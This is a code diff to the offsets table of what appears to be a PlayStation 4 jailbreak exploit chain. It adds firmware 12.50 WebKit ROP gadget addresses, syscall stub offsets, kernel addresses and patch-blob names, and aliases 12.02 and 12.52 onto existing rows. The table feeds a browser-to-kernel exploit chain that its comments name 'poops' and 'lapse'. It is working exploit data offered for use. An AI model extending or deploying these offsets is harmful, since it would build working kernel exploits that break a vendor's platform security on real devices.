@@ -14,6 +14,16 @@ export const REQUIRED_KEYS = [
 ];
 export const OPTIONAL_KEYS = [
     "k_stubs", "wk___imp_pthread_create", "k_pthread_create",
+    // Overrides the patch-blob name, which otherwise derives from the firmware
+    // key ("13.00" -> patches/1300.bin). Needed when two firmwares share one
+    // kernel and therefore one blob.
+    "kpatch",
+    // Names the firmware this block was copied from. Purely declarative -- no
+    // page reads it. tools/checkfw.js needs it: its copy-paste detector flags
+    // two firmwares sharing an RVA, and an alias shares EVERY RVA by
+    // construction, so without this a correct alias reports as 20 defects and
+    // buries a real one.
+    "alias_of",
 ];
 
 export const PS4 = {
@@ -306,7 +316,133 @@ export const PS4 = {
         k_sysent_661:                       0x110a760,
         k_jmp_rsi:                          0x47b31,
     },
+    "12.50": {
+        fw_status: "state=UNTESTED-on-hardware "
+            + "webkit=addfw-from-decrypted-12.50-modules (15/15 gadgets, 35/35 stubs) "
+            + "anchor=findcaller-offline (self-check reproduces the known 11.50 and "
+            + "12.00 anchors) "
+            + "kernel_rvas=asserted-by-supplied-table UNVERIFIED (no 12.50 kernel dump; "
+            + "equal to 13.00's row, which came from the same table) "
+            + "kpatch=1250.bin bug=poops",
+
+        wk_expm1_builtin:                   0x2585110,   // the anchor
+        wk_JSFunction_m_function:           0x28,
+
+        wk_POP_RDI_RET:                     0x4902f,   // 5f c3
+        wk_POP_RSI_RET:                     0x10e37,   // 5e c3
+        wk_POP_RDX_RET:                     0x771ea,   // 5a c3
+        wk_POP_RCX_RET:                     0x5def9,   // 59 c3
+        wk_POP_RAX_RET:                     0x22f53,   // 58 c3
+        wk_POP_R8_RET:                      0x22f52,   // 47 58 c3
+        wk_POP_R9_RET:                      0x60b6c1,   // 47 59 c3
+        wk_LEAVE_RET:                       0x77caa,   // c9 c3
+        wk_MOV_QWORD_PTR_RDI_RAX_RET:       0x2b5cb,   // 48 89 07 c3
+        wk_PUSH_RDX_POP_RSP_RET:            0x2abb0ba,   // 52 5c c3
+        wk_MOV_RDI_RSI_30_CALL:             0x295dd58,   // 48 8b 7e 30 48 8b 07 ff 10
+        wk_POP_RAX_MOV_RAX_JMP_18:          0x8e4873,   // 58 48 8b 07 ff 60 18
+        wk_PUSH_RBP_MOV_RBP_RSP_10:         0x285e10,   // 55 48 89 e5 48 8b 07 ff 50 10
+        wk_MOV_RDI_RAX_8_CALL_20:           0x6c7b0d,   // 48 8b 78 08 48 8b 07 ff 50 20
+        wk_MOV_RDX_RAX_18_CALL_10:          0xd37cca,   // 48 8b 50 38 48 8b 07 ff 50 10
+
+        pivot_view_sp:                      0x38,   // read off G4's displacement
+        wk_ArrayBuffer_m_impl:              0x10,
+        wk_ArrayBuffer_m_contents_m_data:   0x10,
+
+        wk___imp___error:                   0x3cb4c48,
+        k__error:                           0xd9d0,
+        wk___imp_pthread_create:            0x3cb5b80,
+        k_pthread_create:                   0x23d20,
+
+        k_stubs: {
+            3: 0x2c160,   // read
+            4: 0x2b8c0,   // write
+            5: 0x2b960,   // open
+            6: 0x2d610,   // close
+            20: 0x2cb60,   // getpid
+            23: 0x2b6e0,   // setuid
+            24: 0x2d5d0,   // getuid
+            25: 0x2b4c0,   // geteuid
+            30: 0x2c9c0,   // accept
+            54: 0x2cfe0,   // ioctl
+            92: 0x2b640,   // fcntl
+            97: 0x2d040,   // socket
+            98: 0x2b5e0,   // connect
+            104: 0x2d370,   // bind
+            105: 0x2b480,   // setsockopt
+            106: 0x2d470,   // listen
+            118: 0x2b2e0,   // getsockopt
+            135: 0x2c270,   // socketpair
+            240: 0x2d4b0,   // nanosleep
+            331: 0x2c6a0,   // sched_yield
+            432: 0x2b500,   // thr_self
+            466: 0x2cc60,   // rtprio_thread
+            487: 0x2ba70,   // cpuset_getaffinity
+            488: 0x2bd00,   // cpuset_setaffinity
+            538: 0x2b420,   // evf_create
+            539: 0x2b4e0,   // evf_delete
+            544: 0x2bea0,   // evf_set
+            545: 0x2ca20,   // evf_clear
+            632: 0x2d080,   // thr_suspend_ucontext
+            633: 0x2d830,   // thr_resume_ucontext
+            662: 0x2cca0,   // aio_multi_delete
+            663: 0x2c3d0,   // aio_multi_wait
+            664: 0x2d730,   // aio_multi_poll
+            666: 0x2d530,   // aio_multi_cancel
+            669: 0x2bde0,   // aio_submit_cmd
+        },
+        k_scan_stage1:                      0x40000,
+        k_scan_stage2:                      0x60000,
+
+        // KERNEL RVAs -- not derivable from userland modules. These are the
+        // supplied 12.50 table, which is identical to our 13.00 row on every
+        // key we carry. Not independently verified: there is no 12.50 kernel
+        // dump here. step4q byte-gates sysent/jmp before firing either.
+        //
+        // The table also carries PRISON0 and ROOTVNODE. We deliberately do NOT
+        // store those -- chain_poops.js:1722 reads prison0 out of the live
+        // kernel via curproc->ucred->cr_prison, so a wrong constant cannot
+        // exist to be wrong. Its EVF_OFFSET/TARGET_ID_OFFSET are 0 because
+        // netctrl does not use them, which matches k_evf_cv below.
+        k_evf_cv:                           0x0,      // unused by poops
+        k_sysent_661:                       0x110a760,
+        k_jmp_rsi:                          0x47b31,
+        k_kl_lock:                          0xe6c20,  // kernel_base = kl_lock - this
+    },
 };
+
+// 12.02 IS 12.00 for everything this table describes. The 12.00 block's own
+// fw_status reads "kernel_rvas=verified-vs-kernel_1202.elf" -- those offsets
+// were derived from the 12.02 kernel in the first place. Same WebKit gadgets,
+// same kernel RVAs, same ten patch sites, so it takes the same blob
+// (patches/1200.bin) rather than a 1202.bin that does not exist.
+//
+// A copy rather than a shared reference, so its fw_status can say where the
+// data came from without rewriting 12.00's.
+PS4["12.02"] = Object.assign({}, PS4["12.00"], {
+    alias_of: "12.00",
+    fw_status: "state=UNTESTED-on-hardware shares=12.00 "
+        + "kernel_rvas=verified-vs-kernel_1202.elf (this firmware) "
+        + "kpatch=1200.bin-10-sites-verified bug=lapse",
+    kpatch: "1200.bin",
+});
+
+// 12.52 IS 12.50, per the supplied table -- same kernel row, and the WebKit
+// side is taken from the single Lib_dump/12.50 module set because that is the
+// only 12.5x dump we have. The kernel half of that claim is consistent with
+// what we already believed (12.50's row equals 13.00's); the WebKit half is an
+// ASSERTION, not a measurement. If a 12.52 libSceNKWebKit.sprx ever turns up,
+// re-derive with tools/addfw.js and compare -- a moved anchor would fail at
+// stage 1, loudly and harmlessly, rather than corrupting anything.
+//
+// Takes patches/1250.bin, since a 1252.bin does not exist.
+PS4["12.52"] = Object.assign({}, PS4["12.50"], {
+    alias_of: "12.50",
+    fw_status: "state=UNTESTED-on-hardware shares=12.50 "
+        + "webkit=assumed-identical-to-12.50 (no 12.52 module dump) "
+        + "kernel_rvas=asserted-by-supplied-table UNVERIFIED "
+        + "kpatch=1250.bin bug=poops",
+    kpatch: "1250.bin",
+});
 
 export function offsetsFor(uaString) {
     const m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
